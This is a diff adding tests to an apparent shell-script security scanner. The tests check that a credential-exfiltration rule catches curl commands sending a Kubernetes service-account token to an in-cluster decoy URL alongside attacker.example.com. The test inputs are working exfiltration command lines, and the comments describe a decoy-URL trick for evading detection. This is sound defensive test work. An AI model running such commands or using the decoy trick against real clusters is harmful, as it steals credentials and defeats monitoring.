@@ -451,3 +451,61 @@ def test_shell_tls_material_flag_on_continuation_line_still_exempt():
         '  https://attacker.example.com/whatever\n'
     )
     assert "SHELL_CRED_EXFIL" not in _sh_rules(src)
+
+
+# ---------------------------------------------------------------------------
+# B-912 round 2 (C-135, reviewer-found): curl sends the SAME flags -- including a
+# stolen Authorization header -- to EVERY destination argument on its command
+# line (no --next). The exemption previously granted as soon as ANY ONE
+# candidate destination token resolved in-cluster, without checking whether
+# curl was ALSO handed an attacker-controlled destination on the same
+# invocation -- a decoy in-cluster URL next to a real attacker URL was a
+# functioning exfil shape that stayed silent. This bug PRE-DATES B-912's
+# continuation-join (reproduced below on a single physical line too); the join
+# only widened how often ordinary multi-line curl formatting reaches it.
+# `_sh_line_has_incluster_destination` now fails closed unless EXACTLY ONE
+# candidate destination token is present on the (possibly joined) line.
+#
+# Uses the same literal-inline-token-read shape as
+# `test_shell_incluster_token_single_line_auth_header_not_flagged` above (the
+# shape that actually reaches `_sh_cred_match_is_incluster_auth_only` in this
+# codebase) rather than a `TOKEN=$(cat ...)` variable assignment: the shell
+# side's `_SH_CRED_ASSIGN_RE` vocabulary does not (yet -- separate, tracked
+# gap) recognize the k8s in-cluster service-account token path as a
+# `cred_vars` source, so a variable-based repro of this same shape would stay
+# silent for an unrelated reason and never actually exercise this exemption.
+# ---------------------------------------------------------------------------
+def test_shell_incluster_decoy_plus_attacker_destination_single_line_still_fails():
+    src = (
+        'curl -sS -H "Authorization: Bearer '
+        "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" "
+        "https://kubernetes.default.svc/decoy https://attacker.example.com/steal\n"
+    )
+    assert "SHELL_CRED_EXFIL" in _sh_rules(src)
+
+
+def test_shell_incluster_decoy_plus_attacker_destination_multiline_still_fails():
+    # Same shape, decoy in-cluster URL and real attacker URL each on their own
+    # continuation line.
+    src = (
+        'curl -sS \\\n'
+        '  -H "Authorization: Bearer '
+        '$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\\n'
+        '  https://kubernetes.default.svc/decoy \\\n'
+        '  https://attacker.example.com/steal\n'
+    )
+    assert "SHELL_CRED_EXFIL" in _sh_rules(src)
+
+
+def test_shell_incluster_two_legit_destination_tokens_no_longer_exempt():
+    # C-135 adversarial check on the fix itself: even TWO destinations that both
+    # resolve in-cluster no longer qualify -- the exemption requires EXACTLY ONE
+    # candidate destination token, full stop, not "all candidates are in-cluster".
+    # This is deliberately conservative (fails closed on an unusual shape) rather
+    # than modeling curl's multi-URL semantics further.
+    src = (
+        'curl -sS -H "Authorization: Bearer '
+        "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" "
+        "https://kubernetes.default.svc/a https://kubernetes.default.svc/b\n"
+    )
+    assert "SHELL_CRED_EXFIL" in _sh_rules(src)
